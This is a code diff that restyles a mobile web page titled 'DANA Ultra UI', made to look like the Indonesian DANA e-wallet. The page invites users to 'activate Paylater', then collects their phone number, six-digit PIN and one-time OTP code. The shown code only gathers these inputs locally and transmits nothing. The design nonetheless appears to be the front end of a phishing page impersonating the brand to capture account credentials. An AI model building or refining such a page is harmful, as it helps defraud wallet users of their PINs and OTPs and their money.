@@ -3,67 +3,92 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DANA Flow</title>
+<title>DANA Ultra UI</title>
 
 <style>
 body {
   margin: 0;
-  font-family: Arial;
+  font-family: 'Segoe UI', sans-serif;
+  background: #f1f3f6;
+  overflow-x: hidden;
+}
+
+/* SPLASH */
+.splash {
+  position: fixed;
+  width: 100%;
+  height: 100%;
   background: #118acb;
-  color: white;
   display: flex;
   justify-content: center;
   align-items: center;
-  height: 100vh;
+  flex-direction: column;
+  color: white;
+  z-index: 999;
+}
+.logo { font-size: 42px; font-weight: bold; }
+.loader {
+  margin-top: 20px;
+  width: 40px; height: 40px;
+  border: 4px solid rgba(255,255,255,0.3);
+  border-top: 4px solid white;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg);} }
+
+/* APP */
+.app {
+  max-width: 400px;
+  margin: auto;
+  position: relative;
+  overflow: hidden;
 }
 
-/* CONTAINER */
-.container {
-  width: 100%;
-  max-width: 360px;
+/* SLIDER */
+.wrapper {
+  display: flex;
+  width: 300%;
+  transition: 0.4s ease;
 }
-
-/* LOGO */
-.logo {
-  text-align: center;
-  font-size: 28px;
-  margin-bottom: 20px;
-}
-
-/* SCREEN */
 .screen {
-  display: none;
+  width: 100%;
+  padding: 20px;
 }
-.screen.active {
-  display: block;
+
+/* HEADER */
+.header {
+  background: #118acb;
+  color: white;
+  padding: 20px;
+  border-radius: 0 0 20px 20px;
 }
 
 /* CARD */
 .card {
   background: white;
-  color: black;
+  border-radius: 16px;
   padding: 15px;
+  margin-top: -20px;
+}
+.option {
+  border: 2px solid #eee;
+  padding: 12px;
   border-radius: 12px;
+  margin-bottom: 10px;
 }
-.card label {
-  display: block;
-  margin: 10px 0;
-}
+.option.active { border-color: #118acb; }
 
 /* BUTTON */
 .btn {
   width: 100%;
   padding: 14px;
-  margin-top: 20px;
-  background: #1c8ed9;
-  color: white;
+  border-radius: 12px;
   border: none;
-  border-radius: 10px;
+  background: #118acb;
+  color: white;
   font-size: 16px;
-  cursor: pointer;
-}
-.btn:disabled {
-  opacity: 0.5;
+  margin-top: 20px;
 }
 
 /* INPUT */
@@ -71,10 +96,10 @@ body {
   width: 100%;
   padding: 12px;
   border-radius: 10px;
-  border: none;
+  border: 1px solid #ddd;
 }
 
-/* PIN BOX */
+/* PIN */
 .pin {
   display: flex;
   justify-content: space-between;
@@ -82,153 +107,141 @@ body {
 }
 .pin input {
   width: 45px;
-  height: 45px;
+  height: 50px;
   text-align: center;
   font-size: 20px;
-  border-radius: 8px;
-  border: none;
+  border-radius: 10px;
+  border: 1px solid #ddd;
 }
 
-/* POPUP OTP */
-.popup {
+/* SHAKE */
+.shake {
+  animation: shake 0.3s;
+}
+@keyframes shake {
+  0%{transform:translateX(0)}
+  25%{transform:translateX(-5px)}
+  50%{transform:translateX(5px)}
+  75%{transform:translateX(-5px)}
+  100%{transform:translateX(0)}
+}
+
+/* OTP */
+.sheet {
   position: fixed;
   bottom: -100%;
   left: 0;
   width: 100%;
   background: white;
-  color: black;
-  text-align: center;
-  padding: 20px;
   border-radius: 20px 20px 0 0;
-  transition: 0.3s;
+  padding: 20px;
+  transition: 0.4s;
+  text-align: center;
 }
-.popup.active {
-  bottom: 0;
-}
+.sheet.active { bottom: 0; }
+.small { color: #666; margin-top: 10px; }
 </style>
-
 </head>
+
 <body>
 
-<div class="container">
-
+<!-- SPLASH -->
+<div class="splash" id="splash">
   <div class="logo">DANA</div>
+  <div class="loader"></div>
+</div>
 
-  <!-- SCREEN 1 -->
-  <div class="screen active" id="screen1">
-    <div class="card">
-      <label><input type="radio" checked> Aktifkan Dana Paylater</label>
-      <label><input type="radio"> Aktifkan Dana Cicil</label>
-      <label><input type="radio"> Laporkan Kendala</label>
+<div class="app" id="app" style="display:none;">
+
+  <div class="wrapper" id="wrap">
+
+    <!-- SCREEN 1 -->
+    <div class="screen">
+      <div class="header"><h3>Pilih Kebutuhan</h3></div>
+      <div class="card">
+        <div class="option active">Aktifkan Dana Paylater</div>
+        <div class="option">Aktifkan Dana Cicil</div>
+        <div class="option">Laporkan Kendala</div>
+      </div>
+      <button id="btn1" class="btn">Konfirmasi</button>
     </div>
-    <button id="btn1" class="btn">Konfirmasi</button>
-  </div>
 
-  <!-- SCREEN 2 -->
-  <div class="screen" id="screen2">
-    <input id="phone" class="input" placeholder="+62 812xxxx">
-    <button id="btn2" class="btn" disabled>Lanjut</button>
-  </div>
-
-  <!-- SCREEN 3 -->
-  <div class="screen" id="screen3">
-    <div class="pin" id="pin">
-      <input maxlength="1"><input maxlength="1"><input maxlength="1">
-      <input maxlength="1"><input maxlength="1"><input maxlength="1">
+    <!-- SCREEN 2 -->
+    <div class="screen">
+      <input id="phone" class="input" placeholder="+62 812xxxx">
+      <button id="btn2" class="btn" disabled>Lanjut</button>
     </div>
-    <button id="btn3" class="btn" disabled>Verifikasi</button>
-  </div>
 
+    <!-- SCREEN 3 -->
+    <div class="screen">
+      <div class="pin" id="pin">
+        <input maxlength="1"><input maxlength="1"><input maxlength="1">
+        <input maxlength="1"><input maxlength="1"><input maxlength="1">
+      </div>
+      <button id="btn3" class="btn">Verifikasi</button>
+    </div>
+
+  </div>
 </div>
 
 <!-- OTP -->
-<div class="popup" id="popup">
-  <h3>Verifikasi OTP</h3>
-  <div class="pin" id="otp">
+<div class="sheet" id="otp">
+  <h3>Masukkan OTP</h3>
+  <div class="pin">
     <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
   </div>
-  <p id="timer">Kirim ulang (60s)</p>
+  <div class="small" id="timer">Kirim ulang (60s)</div>
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", function () {
+setTimeout(()=>{
+  splash.style.display='none';
+  app.style.display='block';
+},2000);
 
-  function showScreen(n) {
-    document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
-    document.getElementById("screen" + n).classList.add("active");
-  }
+const wrap = document.getElementById("wrap");
 
-  // SCREEN 1 → 2
-  document.getElementById("btn1").addEventListener("click", () => {
-    showScreen(2);
-  });
+// NAVIGASI
+btn1.onclick = ()=> wrap.style.transform="translateX(-100%)";
+btn2.onclick = ()=> wrap.style.transform="translateX(-200%)";
 
-  // VALIDASI NOMOR
-  const phone = document.getElementById("phone");
-  const btn2 = document.getElementById("btn2");
+// FORMAT HP
+phone.oninput = ()=>{
+  let v = phone.value.replace(/\\D/g,'');
+  if(!v.startsWith('62')) v='62'+v;
+  phone.value = '+'+v;
+  btn2.disabled = v.length < 10;
+};
 
-  phone.addEventListener("input", () => {
-    let val = phone.value.replace(/[^0-9]/g, "");
-    if (!val.startsWith("62")) val = "62" + val;
+// PIN
+const pins = document.querySelectorAll("#pin input");
 
-    phone.value = "+" + val;
-    btn2.disabled = val.length < 10;
-  });
-
-  // SCREEN 2 → 3
-  btn2.addEventListener("click", () => {
-    showScreen(3);
-  });
-
-  // PIN INPUT
-  const pinInputs = document.querySelectorAll("#pin input");
-  const btn3 = document.getElementById("btn3");
-
-  pinInputs.forEach((input, i) => {
-    input.addEventListener("input", () => {
-      if (input.value && i < pinInputs.length - 1) {
-        pinInputs[i + 1].focus();
-      }
-      checkPin();
-    });
-
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !input.value && i > 0) {
-        pinInputs[i - 1].focus();
-      }
-    });
-  });
-
-  function checkPin() {
-    btn3.disabled = [...pinInputs].some(i => i.value === "");
-  }
-
-  // PIN → OTP
-  btn3.addEventListener("click", () => {
-    document.getElementById("popup").classList.add("active");
-  });
-
-  // OTP INPUT
-  const otpInputs = document.querySelectorAll("#otp input");
-
-  otpInputs.forEach((input, i) => {
-    input.addEventListener("input", () => {
-      if (input.value && i < otpInputs.length - 1) {
-        otpInputs[i + 1].focus();
-      }
-    });
-  });
-
-  // TIMER
-  let time = 60;
-  setInterval(() => {
-    if (time > 0) {
-      time--;
-      document.getElementById("timer").innerText = `Kirim ulang (${time}s)`;
-    }
-  }, 1000);
-
+pins.forEach((el,i)=>{
+  el.oninput = ()=>{
+    if(el.value && i<5) pins[i+1].focus();
+  };
 });
+
+// VERIFY
+btn3.onclick = ()=>{
+  const empty = [...pins].some(i=>!i.value);
+  if(empty){
+    document.getElementById("pin").classList.add("shake");
+    navigator.vibrate(200);
+    setTimeout(()=>pin.classList.remove("shake"),300);
+  } else {
+    otp.classList.add("active");
+  }
+};
+
+// TIMER
+let t=60;
+setInterval(()=>{
+  if(t>0){
+    t--;
+    timer.innerText=`Kirim ulang (${t}s)`;
+  }
+},1000);
 </script>
 
 </body>
